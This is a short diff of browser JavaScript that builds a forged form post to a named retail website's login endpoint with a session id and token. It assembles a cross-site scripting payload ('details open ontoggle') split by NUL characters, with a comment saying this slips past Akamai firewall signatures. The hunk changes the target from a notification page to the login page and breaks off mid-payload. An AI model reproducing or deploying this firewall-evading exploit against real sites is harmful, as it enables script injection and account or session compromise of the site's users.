@@ -14,7 +14,7 @@ if (!SID || !TOK) {
 } else {
   var N = String.fromCharCode(0);   // NUL splits the Akamai signatures (GAD-012); Hybris strips it
   var f = document.getElementById('f');
-  f.action = 'https://www.watsons.ua/uk/stockAnonymousNotification;jsessionid=' + SID;
+  f.action = 'https://www.watsons.ua/uk/login;jsessionid=' + SID;
   document.getElementById('c').value = TOK;
   document.getElementById('v').value =
     'A"' + N + '><details open on' + N + 'toggle="s=docu' + N +
